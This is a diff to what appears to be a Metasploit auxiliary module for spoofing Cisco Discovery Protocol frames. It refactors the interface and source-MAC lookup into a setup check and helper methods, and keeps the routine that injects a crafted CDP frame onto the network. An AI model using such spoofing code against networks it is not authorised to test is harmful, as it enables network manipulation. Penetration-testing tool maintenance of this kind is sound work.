@@ -120,18 +120,31 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Finished sniffing")
   end
 
+  def setup
+    unless smac
+      fail ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
+    end
+    open_pcap
+    close_pcap
+  end
+
+  def interface
+    @interface ||= datastore['INTERFACE'] || Pcap.lookupdev
+  end
+
+  def smac
+    @smac ||= datastore['SMAC'] || get_mac(interface)
+  end
+
   def send_spoof
     p = prep_cdp                                              # Preparation of the CDP content
     dst_mac = "\x01\x00\f\xCC\xCC\xCC"                        # CDP multicast
 
     # Source Mac Address Preparation
-    @interface = datastore['INTERFACE'] || Pcap.lookupdev
-    smac = datastore['SMAC'] || get_mac(@interface)
-    fail ArgumentError, 'SMAC should be defined' unless smac
     src_mac = mac_to_bytes(smac)
 
     # Injecting packet to the network
-    l = PacketFu::Inject.new(iface: @interface)
+    l = PacketFu::Inject.new(iface: interface)
     cdplength = ["%04X" % (p.length + 8).to_s].pack('H*')
     l.array_to_wire(array: ["#{dst_mac}#{src_mac}#{cdplength}" + llc + p])
   end
@@ -140,8 +153,8 @@ class Metasploit3 < Msf::Auxiliary
     "\xAA\xAA\x03\x00\x00\f \x00"
   end
 
-  def mac_to_bytes(smac)
-    [smac.gsub(':', '')].pack('H*')
+  def mac_to_bytes(mac)
+    [mac.gsub(':', '')].pack('H*')
   end
 
   def prep_cdp
